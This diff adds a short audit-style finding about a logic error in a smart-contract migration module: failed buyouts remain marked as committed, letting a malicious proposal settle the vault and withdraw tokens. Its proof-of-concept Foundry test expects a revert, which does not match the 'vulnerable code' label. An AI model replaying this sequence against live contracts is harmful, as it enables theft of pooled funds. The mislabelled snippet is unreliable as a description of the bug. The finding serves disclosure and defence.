@@ -1,0 +1,26 @@
+Type of vulnerability: Logic Error
+Cause of vulnerability: Inability to distinguish between successful and failed buyouts when settling a migration proposal.
+Execution process: A malicious proposal initiates a buyout that fails but remains marked as committed. A subsequent legitimate proposal initiates a successful buyout. The malicious proposal can then call `settleVault` and proceed to withdraw tokens, despite the buyout failure.
+Vulnerable code: 
+```solidity
+function testPanprogBugH3() public {
+    initializeMigration(alice, bob, 10000, 4000, true);
+    (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();
+    address[] memory newModules = new address[](2);
+    newModules[0] = migration;
+    newModules[1] = modules[1];
+    bob.migrationModule.propose(vault, newModules, nftReceiverPlugins, nftReceiverSelectors, TOTAL_SUPPLY * 2, 1 ether);
+    bob.migrationModule.join{value: 1 ether}(vault, 1, 4000);
+    bob.migrationModule.commit(vault, 1);
+    vm.warp(rejectionPeriod + 1);
+    bob.buyoutModule.end(vault, burnProof);
+    bob.migrationModule.withdrawContribution(vault, 1);
+    alice.migrationModule.propose(vault, newModules, nftReceiverPlugins, nftReceiverSelectors, TOTAL_SUPPLY * 10, 1 ether);
+    alice.migrationModule.join{value: 1 ether}(vault, 2, 6000);
+    alice.migrationModule.commit(vault, 2);
+    vm.warp(proposalPeriod * 10);
+    alice.buyoutModule.end(vault, burnProof);
+    vm.expectRevert(abi.encodeWithSelector(IMigration.UnsuccessfulMigration.selector));
+    bob.migrationModule.settleVault(vault, 2);
+}
+```
